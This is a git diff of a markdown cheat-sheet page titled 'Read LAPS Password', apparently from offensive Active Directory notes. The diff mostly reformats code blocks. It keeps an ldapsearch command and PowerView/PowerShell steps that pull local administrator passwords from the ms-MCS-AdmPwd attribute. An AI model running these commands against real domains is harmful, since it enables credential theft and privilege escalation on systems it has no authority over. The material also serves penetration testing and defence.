@@ -4,7 +4,6 @@ date: 2024-7-30
 tags: ["ReadLAPSPassword", "active driectory", "ad", "Windows", "LAPS"]
 ---
 
----
 ### Abuse #1: Read LAPS Password
 
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
@@ -13,8 +12,8 @@ tags: ["ReadLAPSPassword", "active driectory", "ad", "Windows", "LAPS"]
 
 <div>
 
-```bash
-ldapsearch -h 10.10.11.10 -b 'DC=<,example>,DC=<com>' -x -D <USER>@<TARGET> -w <PASSWORD> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+```console
+ldapsearch -h <TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' -x -D <USER>@<TARGET> -w '<PASSWORD>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
 ```
 
 </div>
@@ -26,7 +25,7 @@ ldapsearch -h 10.10.11.10 -b 'DC=<,example>,DC=<com>' -x -D <USER>@<TARGET> -w <
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -36,15 +35,15 @@ ldapsearch -h 10.10.11.10 -b 'DC=<,example>,DC=<com>' -x -D <USER>@<TARGET> -w <
 
 <div>
 
-```powershell
-$username = "<DOMAIN>\<USER>"
+```console
+$username = '<DOMAIN>\<USER>'
 ```
 
-```powershell
-$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
+```console
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 ```
 
-```powershell
+```console
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
@@ -54,7 +53,7 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 <div>
 
-```powershell
+```console
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
 ```
 
